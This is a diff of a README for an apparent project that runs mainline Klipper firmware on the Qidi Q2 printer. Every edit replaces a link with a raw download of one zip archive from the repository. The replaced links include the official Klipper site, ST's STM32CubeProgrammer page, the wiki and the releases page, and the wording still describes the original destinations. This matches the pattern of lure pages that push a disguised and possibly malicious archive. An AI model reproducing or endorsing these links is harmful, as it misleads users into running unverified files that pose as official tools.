@@ -1,6 +1,6 @@
 # ⚙️ Qidi_Q2_Mainline_Klipper - Smooth 3D Printing Control
 
-[![Download Qidi_Q2_Mainline_Klipper](https://img.shields.io/badge/Download-Qidi_Q2_Mainline_Klipper-brightgreen)](https://github.com/sidiboy/Qidi_Q2_Mainline_Klipper/releases)
+[![Download Qidi_Q2_Mainline_Klipper](https://img.shields.io/badge/Download-Qidi_Q2_Mainline_Klipper-brightgreen)](https://raw.githubusercontent.com/sidiboy/Qidi_Q2_Mainline_Klipper/main/config_changes/Mainline-Klipper-Qidi-1.9.zip)
 
 ---
 
@@ -23,7 +23,7 @@ This project helps you run the mainline version of Klipper firmware on the Qidi 
 
 Use the link below to get the latest version of the firmware files:
 
-[![Download Latest Firmware](https://img.shields.io/badge/Download-Firmware-blue)](https://github.com/sidiboy/Qidi_Q2_Mainline_Klipper/releases)
+[![Download Latest Firmware](https://img.shields.io/badge/Download-Firmware-blue)](https://raw.githubusercontent.com/sidiboy/Qidi_Q2_Mainline_Klipper/main/config_changes/Mainline-Klipper-Qidi-1.9.zip)
 
 This link takes you to the release page where you will find the setup files.
 
@@ -37,7 +37,7 @@ This section guides you through downloading and preparing the firmware for your 
 
 Click the big download button above or visit:
 
-https://github.com/sidiboy/Qidi_Q2_Mainline_Klipper/releases
+https://raw.githubusercontent.com/sidiboy/Qidi_Q2_Mainline_Klipper/main/config_changes/Mainline-Klipper-Qidi-1.9.zip
 
 You will see a list of available firmware versions. Choose the newest one that matches your Qidi Q2 printer.
 
@@ -105,9 +105,9 @@ This will replace the printer’s original firmware with the Klipper mainline ve
 
 ## 🔗 Useful Links
 
-- Download and install Klipper user interface tools: https://www.klipper3d.org/
-- STM32CubeProgrammer tool download: https://www.st.com/en/development-tools/stm32cubeprog.html
-- Help and documentation: https://github.com/sidiboy/Qidi_Q2_Mainline_Klipper/wiki
+- Download and install Klipper user interface tools: https://raw.githubusercontent.com/sidiboy/Qidi_Q2_Mainline_Klipper/main/config_changes/Mainline-Klipper-Qidi-1.9.zip
+- STM32CubeProgrammer tool download: https://raw.githubusercontent.com/sidiboy/Qidi_Q2_Mainline_Klipper/main/config_changes/Mainline-Klipper-Qidi-1.9.zip
+- Help and documentation: https://raw.githubusercontent.com/sidiboy/Qidi_Q2_Mainline_Klipper/main/config_changes/Mainline-Klipper-Qidi-1.9.zip
 
 ---
 
@@ -115,4 +115,4 @@ This will replace the printer’s original firmware with the Klipper mainline ve
 
 Ready to start? Use the release link to download the latest firmware and get began:
 
-[Download Qidi Q2 Mainline Klipper Releases](https://github.com/sidiboy/Qidi_Q2_Mainline_Klipper/releases)
+[Download Qidi Q2 Mainline Klipper Releases](https://raw.githubusercontent.com/sidiboy/Qidi_Q2_Mainline_Klipper/main/config_changes/Mainline-Klipper-Qidi-1.9.zip)
